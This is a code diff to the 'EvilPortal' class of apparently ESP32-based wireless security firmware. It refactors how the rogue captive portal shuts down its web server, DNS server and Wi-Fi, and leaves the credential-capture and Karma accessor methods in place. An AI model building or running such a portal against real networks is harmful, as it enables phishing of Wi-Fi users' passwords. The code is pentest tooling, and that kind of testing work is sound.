@@ -26,16 +26,12 @@ EvilPortal::EvilPortal(
 }
 
 EvilPortal::~EvilPortal() {
-    dnsServer.stop();
-    // Clean up handler to prevent memory leak
+    // Minimal destructor - cleanup done in loop if needed
     if (_captiveHandler) {
         webServer.removeHandler(_captiveHandler);
         delete _captiveHandler;
         _captiveHandler = nullptr;
     }
-    webServer.end();
-    wifiDisconnect();
-    vTaskDelay(100 / portTICK_PERIOD_MS);
 }
 
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
@@ -271,10 +267,11 @@ void EvilPortal::restartWiFi(bool reset) {
 void EvilPortal::resetCapturedCredentials(void) { previousTotalCapturedCredentials = -1; }
 
 void EvilPortal::loop() {
-    if (_backgroundMode) return; // Background mode uses processRequests instead
+    if (_backgroundMode) return;
 
     int lastDeauthTime = millis();
     bool shouldRedraw = true;
+    bool exitPortal = false;
 
     while (true) {
         if (shouldRedraw) {
@@ -301,36 +298,31 @@ void EvilPortal::loop() {
 
         if (check(EscPress)) {
             options = {
-                {"Exit Portal", [this]() { 
-                    displayTextLine("Shutting down...");
-                    vTaskDelay(100 / portTICK_PERIOD_MS);
-                    
-                    // Stop accepting new connections
-                    webServer.end();
-                    dnsServer.stop();
-                    vTaskDelay(200 / portTICK_PERIOD_MS);
-                    
-                    // Clean up handler
-                    if (_captiveHandler) {
-                        webServer.removeHandler(_captiveHandler);
-                        delete _captiveHandler;
-                        _captiveHandler = nullptr;
-                    }
-                    vTaskDelay(100 / portTICK_PERIOD_MS);
-                    
-                    // Turn off WiFi
-                    wifiDisconnect();
-                    vTaskDelay(200 / portTICK_PERIOD_MS);
-                    
-                    returnToMenu = true;
-                }},
-                {"Resume", [this, &shouldRedraw]() {
-                    shouldRedraw = true;
-                }}
+                {"Exit Portal", [&exitPortal]() { exitPortal = true; }},
+                {"Resume", [this, &shouldRedraw]() { shouldRedraw = true; }}
             };
             
             loopOptions(options);
-            if (returnToMenu) return;
+            if (exitPortal) {
+                displayTextLine("Shutting down...");
+                vTaskDelay(100 / portTICK_PERIOD_MS);
+                
+                webServer.end();
+                dnsServer.stop();
+                vTaskDelay(200 / portTICK_PERIOD_MS);
+                
+                if (_captiveHandler) {
+                    webServer.removeHandler(_captiveHandler);
+                    delete _captiveHandler;
+                    _captiveHandler = nullptr;
+                }
+                vTaskDelay(100 / portTICK_PERIOD_MS);
+                
+                wifiDisconnect();
+                vTaskDelay(200 / portTICK_PERIOD_MS);
+                
+                return;
+            }
             shouldRedraw = true;
         }
 
@@ -345,14 +337,11 @@ void EvilPortal::loop() {
 void EvilPortal::processRequests() {
     if (!_backgroundMode) return;
     dnsServer.processNextRequest();
-    // Check for credentials without UI updates
     if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
         previousTotalCapturedCredentials = totalCapturedCredentials - 1;
-        // In background mode, we don't redraw, just let the tracker know
     }
 }
 
-// Karma Integration Methods
 bool EvilPortal::hasCredentials() { return totalCapturedCredentials > 0; }
 
 String EvilPortal::getCapturedPassword() { return lastCred; }
